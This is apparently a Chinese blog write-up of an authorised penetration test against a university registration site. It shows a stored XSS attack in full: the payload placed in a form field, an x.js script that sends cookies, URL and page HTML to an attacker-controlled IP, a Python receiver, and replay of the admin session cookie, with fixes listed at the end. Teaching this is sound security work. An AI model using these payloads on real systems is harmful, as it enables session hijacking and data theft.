---
translationKey: stored-xss-admin-session-hijack
locale: zh-cn
routeSlug: stored-xss-admin-session-hijack
title: 一个存储 XSS 打穿管理员的完整实战：从表单到会话劫持
excerpt: 复盘一次授权测试中的存储型 XSS 链路，从前台表单存储、后台触发到 Cookie 外带和会话劫持验证。
author: A1right
seoTitle: 存储 XSS 实战：从表单到管理员会话劫持
seoDescription: A1right 记录存储型 XSS 授权测试复盘，覆盖注入点确认、触发环境、外带脚本、Cookie 安全属性与修复建议。
categoryKey: agent-pentest
category: WEB渗透测试
tags:
  - Web 基础
  - XSS
  - 存储型 XSS
  - Cookie 安全
  - 渗透测试
visibility: public
publishMode: now
publishedAt: 2026-09-19
updatedAt: 2026-09-19
cover: /images/uploads/stored-xss-cover.jpg
coverAlt: 雪夜中持刀的动漫角色
contentType: original
allowRepost: allow-with-attribution
pinned: false
draft: false
---
# 一个存储 XSS 打穿管理员的完整实战：从表单到会话劫持

> 本文是一次授权测试实战的完整复盘教学。目标为某高校在线报名系统（PHP 5.3 + Apache 老站），前台报名字段存在存储型 XSS，最终以"管理员会话 Cookie 被窃取、会话被直接劫持"闭环收场。
> 全程链路：**前台存储 → 后台列表页原样渲染 → 管理员打开即执行 → Cookie 外带 → 用偷到的会话读后台数据**。
> 规则提醒：以下所有操作都在授权测试链路内完成；测试账号由授权方提供；报告与文章中会话值已脱敏。

# 一、先说结论：XSS 到底能干什么

很多人对XSS的印象停留在“弹某个alert”，但存储型XSS的杀伤力核心是三点：

- 它可以在目标的浏览器执行任意脚本，等于我们拥有了“受害者的键盘和眼睛”
- 如果会话Cookie没挂HttpOnly和Secure，document.cookie可以直接把手伸进登录态
- 如果目标没有CSP，外链脚本、图片外带畅通无阻

这次实战就是这三点的完整兑现：一个前台的姓名字段，最终变成了"管理员登录态直接易主"。

```
前台 /baoming/dorder.php 姓名字段（无过滤存储）
        ↓
后台 /baoming/admin/baoming_list.php 列表页(原样输出，无实体化)
        ↓
管理员打开列表页 → &lt;script src=攻击者服务器/x.js> 自动加载执行
        ↓
x.js 外带 document.cookie → 攻击者服务器 access.log 命中
        ↓
用偷到的 PHPSESSID 直接访问后台 → 字节级验证读到管理数据 = 会话劫持实锤
```

# 二、前置知识：一条存储 XSS 要打穿，需要凑齐三件套

| 要素         | 是什么                                               | 这次实战对应的东西                       |
| ------------ | ---------------------------------------------------- | ---------------------------------------- |
| **存储点**   | 能写入数据库、且"别人"（最好是管理员）会去看的输入点 | 前台报名表单的姓名字段                   |
| **触发环境** | 一个会去渲染该数据的页面（管理员日常浏览）           | 后台"报名管理列表"页，新记录排第一页首行 |
| **接收端**   | 你自己可控的服务器，收集外带数据                     | 一台 VPS + `python3 -m http.server 8000` |

三个前提决定成败：**内容是否原样渲染**（实体化就废了）、**数据是否会被目标身份浏览**（没人看就永远不触发）、**外带目标是否可达且不被拦**（混合内容/CSP 都是拦路虎）。

再记两个关键概念：

- **HttpOnly**：Cookie 一旦带这个标志，`document.cookie` 就**读不到**它。老 PHP 站点默认不开，这次目标的 `Set-Cookie: PHPSESSID=...; path=/` 就没有 HttpOnly——这是能偷成功的先决条件。
- **CSP（Content-Security-Policy）**：白名单机制，限制脚本从哪来。这次目标响应头里什么都没有，等于高速公路不限速。

# 三、实战六步

## 第一步：侦察——先摸清边界再动手

拿到目标先不急着打，先把"注入点长什么样、编码是什么、有没有防护头"搞清楚。

```bash
curl -s -D- -o /dev/null http://*********cn/
```

关键发现（实测响应头）：

```http
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Unix) PHP/5.3.28
```

- 全程没有任何 `Content-Security-Policy`、`X-Frame-Options` 等安全响应头 → CSP 路线畅通；
- 后台登录页 `Set-Cookie: PHPSESSID=...; path=/` **无 HttpOnly** → `document.cookie` 可读；

![image-20260918230617859](/images/uploads/stored-xss-01.png)

表单结构（首页源码）：`&lt;FORM action="baoming/dorder.php" method=post>`，姓名字段 `realname`，`maxlength=100`。

![image-20260918230716534](/images/uploads/stored-xss-02.png)

## 第二步：架接收端

在自己服务器上起一个最糙的 HTTP 服务，access log 就是证据库：

```bash
mkdir -p /tmp/xsspoc
cat > /tmp/xsspoc/x.js <<'EOF'
new Image().src="http://154.*.***.***:8443/hit?c="+encodeURIComponent(document.cookie)+"&u="+encodeURIComponent(location.href)+"&d="+encodeURIComponent(document.documentElement.innerHTML.slice(0,2000));
EOF
cd /tmp/xsspoc && nohup python3 -m http.server 8443 --bind 0.0.0.0 > /tmp/xsspoc/access.log 2>&1 &
```

```bash
# 外网验证接收端可达
curl -s http://***.*.***.***:8443/x.js
```

为什么外带脚本要写三个参数：

| 参数 | 内容                  | 用途                                             |
| ---- | --------------------- | ------------------------------------------------ |
| `c`  | `document.cookie`     | 会话 Cookie（核心战利品）                        |
| `u`  | `location.href`       | 确认在哪个页面触发的（证明是管理后台）           |
| `d`  | 页面前 2000 字符 HTML | 拿到页面上下文做二次证据（连后台功能都能带出来） |



## 第三步：Payload 设计——为什么用 `&lt;script src>` 而不是 `&lt;script>alert(1)&lt;/script&gt;`

之前学的 XSS 是弹窗，实战里 payload 设计的第一原则是**短、可控、可演进**：

| 方案                                                   | 长度   | 问题                                             |
| ------------------------------------------------------ | ------ | ------------------------------------------------ |
| `&lt;script>alert(document.cookie)&lt;/script&gt;`              | 41     | 只有自己能看见，无外带                           |
| `&lt;script>new Image().src="http://x/"&lt;/script&gt;`         | 43     | 每次改逻辑都要重新提交一条记录                   |
| `&lt;script src=http://***.*.***.***:8443/x.js>&lt;/script&gt;` | **51** | 外链托管，改 x.js 即改全站执行逻辑，无需重新投放 |

外链方案的本质是**把"执行代码"和"攻击逻辑"解耦**：植入的只有一行加载器，真正的逻辑全部放在自己服务器上，随时热更新。这也是实战里最常用的形态。\

## 第四步：投放payload

![image-20260919145706571](/images/uploads/stored-xss-03.png)

主要payload

`&lt;script src=http://***.*.***.***:8443/x.js>&lt;/script&gt;`

![image-20260919145800557](/images/uploads/stored-xss-04.png)

订单号都分配了，记录必然进了数据库。这是"提交成功"的第一手证据，不需要猜。

## 第五步：管理员访问

登陆管理后台

![image-20260919150025033](/images/uploads/stored-xss-05.png)

访问报名管理

![image-20260919150217027](/images/uploads/stored-xss-06.png)

这是我之前存的存储xss

## 第六步：接管admin权限

回到我们的服务器

重新 `tail -30 /tmp/xsspoc/access.log` 看最近 30 行日志

![image-20260919150414057](/images/uploads/stored-xss-07.png)

回到浏览器中，我们在正常填报报名的页面替换cookie

![image](/images/uploads/stored-xss-08.png)

之后直接访问admin才能访问的报名管理列表，发现成功访问，实现admin的劫持与权限接管

![image-20260919155515377](/images/uploads/stored-xss-09.png)

# 四、总结：这个洞为什么打得穿

1. **输出未转义**：姓名字段入库后原样输出，`htmlspecialchars($name, ENT_QUOTES)` 就能让 `&lt;script>` 变字符串——输出转义是存储 XSS 的第一道也是最重要的一道防线；
2. **无 HttpOnly**：`session.cookie_httponly=On`；
3. **无 CSP**：至少 `default-src 'self'`，外链脚本直接拦死；
4. **老站没有二次防护**：PHP 5.3 已在生命周期末端，管理员后台应有访问控制增强（IP 绑定/二次认证），降低会话劫持的收益；

# 五、知识点补充

## 1. 没有 `Content-Security-Policy`、`X-Frame-Options` → CSP 路线畅通

### `Content-Security-Policy` 是什么

CSP 是服务器通过响应头告诉浏览器的一条安全策略，用来限制页面能加载哪些资源。

例如：

http

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```



意思是：页面只能加载同源资源，脚本也只能从自己站点加载。

如果目标没有 CSP，浏览器默认不会限制脚本来源，攻击者就可以让页面加载：

html

```
&lt;script src="http://攻击者服务器/x.js">&lt;/script&gt;
```



浏览器会去攻击者服务器下载并执行这个 JS。

所以“CSP 路线畅通”的意思是：
**没有 CSP 拦着，外链脚本可以加载执行，外带数据也更容易成功。**

## 2. `Set-Cookie: PHPSESSID=...; path=/` 无 `HttpOnly` → `document.cookie` 可读

### `PHPSESSID` 是什么

PHP 默认用 `PHPSESSID` 这个 Cookie 保存会话 ID。
用户登录后，服务器就靠这个 ID 识别“你是谁”。

如果管理员登录后台，他的浏览器里就会有一个管理员的 `PHPSESSID`。
谁拿到这个值，谁就相当于拿到了管理员的登录态。

### `HttpOnly` 是什么

`HttpOnly` 是 Cookie 的一个属性。

如果服务器这样设置：

http

```
Set-Cookie: PHPSESSID=xxxx; path=/; HttpOnly
```



那么浏览器会禁止 JavaScript 通过 `document.cookie` 读取这个 Cookie。

但如果没有 `HttpOnly`：

http

```
Set-Cookie: PHPSESSID=xxxx; path=/
```



那么页面里的 JS 就可以直接读：

js

```
document.cookie
```



攻击者的 XSS 脚本就能把 `PHPSESSID` 发到自己的服务器。

### `path=/` 是什么

表示这个 Cookie 在整个站点路径下都会带上，不影响 JS 读取，只是说明作用范围。

## 3.架接收端的部分讲解

> cat > /tmp/xsspoc/x.js <<'EOF'
> new Image().src="http://154.*.***.***:8443/hit?c="+encodeURIComponent(document.cookie)+"&u="+encodeURIComponent(location.href)+"&d="+encodeURIComponent(document.documentElement.innerHTML.slice(0,2000));
> EOF

这段命令的作用是：**在攻击者控制的服务器上生成一个外链 JS 文件 `x.js`，当受害者的浏览器加载并执行它时，会把当前页面的 Cookie、URL 和部分 HTML 偷偷发到攻击者服务器的日志里。**

这是存储型 XSS 里的“外带脚本”，用来偷数据。

### 1. `cat > /tmp/xsspoc/x.js <<'EOF' ... EOF`

bash

```
cat > /tmp/xsspoc/x.js <<'EOF'
...
EOF
```



这是 Linux shell 的 here-doc 写法：

- `cat > /tmp/xsspoc/x.js`：创建或覆盖 `/tmp/xsspoc/x.js` 文件。
- `<<'EOF'`：开始写入内容，直到遇到单独一行的 `EOF` 结束。
- 单引号 `'EOF'` 表示里面的内容原样写入，不做 shell 变量替换。

所以这一步就是在服务器上放一个恶意 JS 文件，等着受害者浏览器来加载。

### 2. JS 内容逐段解释

```
new Image().src="http://154.*.***.***:8443/hit?c="
+encodeURIComponent(document.cookie)
+"&u="+encodeURIComponent(location.href)
+"&d="+encodeURIComponent(document.documentElement.innerHTML.slice(0,2000));
```

### `new Image().src=...`

创建一个图片对象，并给它设置 `src`。
浏览器一旦看到 `src`，就会自动发起一个 GET 请求去加载这个“图片”。

关键点：

- 不需要把图片插入页面，`new Image().src` 就会发请求。
- 图片请求可以跨域，不受同源策略限制。
- 老浏览器兼容性好。
- 如果目标没有 CSP，这种外带方式很畅通。

所以它本质上不是加载图片，而是**借图片请求把数据带出去**。

------

### `http://154.*.***.***:8443/hit?`

这是攻击者服务器的地址和接收路径。

- `154.*.***.***`：攻击者 VPS 的 IP。
- `8443`：接收端监听的端口。
- `/hit`：自定义路径，不一定要真实存在。
  即使服务器返回 404，请求也会被记录到 `access.log` 里，所以攻击者只需要看日志。

### `c=` + `encodeURIComponent(document.cookie)`

- `document.cookie`：读取当前页面可访问的 Cookie。
- 如果 `PHPSESSID` 没有 `HttpOnly`，这里就能读到管理员的会话 ID。
- `encodeURIComponent(...)`：把 Cookie 里的特殊字符编码，避免破坏 URL 参数结构。

### `u=` + `encodeURIComponent(location.href)`

- `location.href`：当前页面的完整 URL。
- 作用是告诉攻击者：受害者在哪个页面触发了 XSS。
- 同样用 `encodeURIComponent` 编码。

### `d=` + `encodeURIComponent(document.documentElement.innerHTML.slice(0,2000))`

- `document.documentElement`：整个 `<html>` 元素。
- `.innerHTML`：拿到页面 HTML 内容。
- `.slice(0,2000)`：只取前 2000 个字符。
- `encodeURIComponent(...)`：编码后放进 URL。

作用：

- 看看后台页面里有什么敏感信息；
- 可能包含 CSRF token、用户名、表单、隐藏字段、报名数据等；
- 限制 2000 字符是为了避免 URL 太长、请求失败或日志难读。



### cd /tmp/xsspoc && nohup python3 -m http.server 8443 --bind 0.0.0.0 > /tmp/xsspoc/access.log 2>&1 &

这条命令的作用是：

> **在你自己的 VPS 上启动一个临时 HTTP 服务器，用来托管 `x.js`，并把所有访问请求记录到 `access.log`。**
> 这样管理员浏览器加载 `x.js`、以及 `x.js` 外带 Cookie 的请求，都会留在日志里。

拆开看：

bash

```
cd /tmp/xsspoc && \
nohup python3 -m http.server 8443 --bind 0.0.0.0 \
> /tmp/xsspoc/access.log 2>&1 &
```



| 部分                          | 作用                                                  |
| :---------------------------- | :---------------------------------------------------- |
| `cd /tmp/xsspoc`              | 进入 `/tmp/xsspoc` 目录，把它作为 HTTP 服务器的根目录 |
| `nohup`                       | 忽略挂断信号，SSH 断开后进程继续运行                  |
| `python3 -m http.server 8443` | 用 Python 起一个静态 HTTP 服务，监听 8000 端口        |
| `--bind 0.0.0.0`              | 绑定所有网卡，允许外部通过 VPS 公网 IP 访问           |
| `> /tmp/xsspoc/access.log`    | 把标准输出重定向到日志文件                            |
| `2>&1`                        | 把标准错误也合并到同一个日志文件                      |
| `&`                           | 放到后台运行                                          |
